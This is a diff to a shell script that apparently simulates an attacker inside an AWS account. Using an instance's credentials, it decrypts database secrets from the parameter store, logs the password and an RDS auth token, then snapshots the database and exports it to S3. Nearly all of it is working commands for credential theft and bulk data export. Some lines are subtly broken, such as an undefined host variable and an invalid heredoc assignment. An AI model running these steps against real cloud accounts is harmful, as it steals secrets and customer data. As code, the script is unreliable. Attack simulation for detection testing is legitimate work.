@@ -49,70 +49,8 @@ aws configure set aws_session_token $AWS_SESSION_TOKEN --profile=$PROFILE
 log "Running: aws sts get-caller-identity --profile=instance"
 aws sts get-caller-identity --profile=instance >> $LOGFILE 2>&1
 
-aws ssm get-parameter --name="db_host" --with-decryption --profile=instance --region=${region}
-aws ssm get-parameter --name="db_name" --with-decryption --profile=instance --region=${region}
-aws ssm get-parameter --name="db_username" --with-decryption --profile=instance --region=${region}
-aws ssm get-parameter --name="db_password" --with-decryption --profile=instance --region=${region}
-
-AWS_ACCOUNT_NUMBER=$(aws sts get-caller-identity --profile=instance | jq -r '.Account')
-DATE=$(date '+%Y-%m-%d')
-EPOCH_TIME=$(date +%s)
-aws s3api create-bucket --bucket db-backup-${environment}-${deployment}-$DATE --region=${region}
-POLICY=cat <<EOF
-{
-    "Version": "2012-10-17",
-    "Statement": [
-        {
-            "Sid": "ExportPolicy",
-            "Effect": "Allow",
-            "Action": [
-                "s3:PutObject*",
-                "s3:ListBucket",
-                "s3:GetObject*",
-                "s3:DeleteObject*",
-                "s3:GetBucketLocation"
-            ],
-            "Resource": [
-                "arn:aws:s3:::db-backup-${environment}-${deployment}-$DATE",
-                "arn:aws:s3:::db-backup-${environment}-${deployment}-$DATE/*"
-            ]
-        }
-    ]
-}
-EOF
-ROLE=cat<<EOF
-{
-  "Version": "2012-10-17",
-  "Statement": [
-    {
-      "Effect": "Allow",
-      "Principal": {
-        "Service": "export.rds.amazonaws.com"
-      },
-      "Action": "sts:AssumeRole"
-    }
-  ] 
-}
-EOF
-POLICY_ARN=$(aws iam create-policy  --policy-name db-export-policy-${environment}-${deployment} --policy-document=$POLICY | jq -r '.Policy.Arn')
-ROLE_ARN=$(aws iam create-role  --role-name rds-s3-export-role-${environment}-${deployment}  --assume-role-policy-document=$ROLE | jq -r '.Role.Arn')
-aws iam attach-role-policy  --policy-arn=$POLICY_ARN  --role-name=rds-s3-export-role-${environment}-${deployment}
-
-aws rds export-table-to-point-in-time \
-  --source-arn arn:aws:rds:${region}:$ACCOUNT_NUMBER:table:cast \
-  --s3-bucket db-backup-${environment}-${deployment}-$DATE \
-  --s3-prefix backup \
-  --export-time $EPOCH_TIME
-
-# # prefer scoutsuite for discovery
-# docker run --rm --name=scoutsuite --env-file=.aws-ec2-instance rossja/ncc-scoutsuite:aws-latest scout aws
-
-# log "Setting User-agent: AWS_EXECUTION_ENV=discovery"
-# export AWS_EXECUTION_ENV="discovery"
-
-# log "Starting..."
-# log "Discovery access attacker simulation..."
-# log "Current IP: $(curl -s http://icanhazip.com)"
+log "Runnind discovery..."
+docker run --rm --name=scoutsuite --env-file=.aws-ec2-instance rossja/ncc-scoutsuite:aws-latest scout aws
 # opts="--output json --color off --no-cli-pager"
 # for REGION in $(aws ec2 describe-regions --output text | cut -f4); do
 #     log "Discovery using AWS_REGION: $REGION"
@@ -138,6 +76,56 @@ aws rds export-table-to-point-in-time \
 #     aws ec2 describe-volumes $opts --region "$REGION" --profile=$PROFILE >> $LOGFILE 2>&1
 #     log "Running: aws ec2 describe-vpcs $opts --region \"$REGION\""
 #     aws ec2 describe-vpcs $opts --region "$REGION" --profile=$PROFILE >> $LOGFILE 2>&1
+#     log "Running: aws rds describe-db-instances $opts --region \"$REGION\""
+#     aws rds describe-db-instances $opts --region "$REGION" --profile=$PROFILE >> $LOGFILE 2>&1
+#     log "Running: aws ssm describe-parameters $opts --region \"$REGION\""
+#     aws ssm describe-parameters $opts --region "$REGION" --profile=$PROFILE >> $LOGFILE 2>&1
 # done
 
-log "Done."
+REGION=${region}
+aws ssm get-parameter --name="db_host" --with-decryption --profile=$PROFILE --region=$REGION >> $LOGFILE 2>&1
+aws ssm get-parameter --name="db_name" --with-decryption --profile=$PROFILE --region=$REGION >> $LOGFILE 2>&1
+aws ssm get-parameter --name="db_port" --with-decryption --profile=$PROFILE --region=$REGION >> $LOGFILE 2>&1
+aws ssm get-parameter --name="db_region" --with-decryption --profile=$PROFILE --region=$REGION >> $LOGFILE 2>&1
+aws ssm get-parameter --name="db_username" --with-decryption --profile=$PROFILE --region=$REGION >> $LOGFILE 2>&1
+aws ssm get-parameter --name="db_password" --with-decryption --profile=$PROFILE --region=$REGION >> $LOGFILE 2>&1
+
+log "Getting db connect token..."
+DBHOST="$(aws ssm get-parameter --name="db_host" --with-decryption --profile=$PROFILE --region=$REGION | jq -r '.Parameter.Value')"
+DBUSER="$(aws ssm get-parameter --name="db_username" --with-decryption --profile=$PROFILE --region=$REGION | jq -r '.Parameter.Value')"
+DBPORT="$(aws ssm get-parameter --name="db_port" --with-decryption --profile=$PROFILE --region=$REGION | jq -r '.Parameter.Value')"
+TOKEN="$(aws rds generate-db-auth-token --hostname $RDSHOST --port $DBPORT --region $REGION --username $DBUSER)"
+log "Token: $TOKEN"
+
+# connect to mysql database - optional
+# curl -LOJ https://s3.amazonaws.com/rds-downloads/rds-combined-ca-bundle.pem
+# mysql --host=$DBHOST --port=$DBPORT --ssl-ca=rds-combined-ca-bundle.pem --enable-cleartext-plugin --user=$DBUSER --password=$TOKEN
+
+log "Getting current account number..."
+AWS_ACCOUNT_NUMBER=$(aws sts get-caller-identity --profile=instance | jq -r '.Account')
+log "Account Number: $AWS_ACCOUNT_NUMBER"
+
+log "Getting DbInstanceIdentifier..."
+DB_INSTANCE_ID=$(aws rds describe-db-instances \
+  --profile=instance \
+  --region=$REGION  \
+  | jq -r '.DBInstances[] | select(.TagList[] | (.Key == "environment" and .Value == "${environment}")) | select(.TagList[] | (.Key == "deployment" and .Value == "${deployment}")) | .DBInstanceIdentifier')
+log "DbInstanceIdentifier: $DB_INSTANCE_ID"
+
+log "Creating rds snapshot..."
+aws rds create-db-snapshot \
+    --profile=instance  \
+    --region=$REGION  \
+    --db-instance-identifier $DB_INSTANCE_ID \
+    --db-snapshot-identifier snapshot-${environment}-${deployment} \
+    --tags "environment=${environment},deployment=${deployment}" >> $LOGFILE 2>&1
+    
+log "Exporting rds snapshot to s3..."
+aws rds export-db-snapshot-to-s3 \
+  --profile=instance  \
+  --region=$REGION  \
+  --db-snapshot-identifier snapshot-${environment}-${deployment} \
+  --s3-bucket-name db-backup-${environment}-${deployment} \
+  --iam-role-arn rds-s3-export-role-${environment}-${deployment} >> $LOGFILE 2>&1
+
+log "Done"
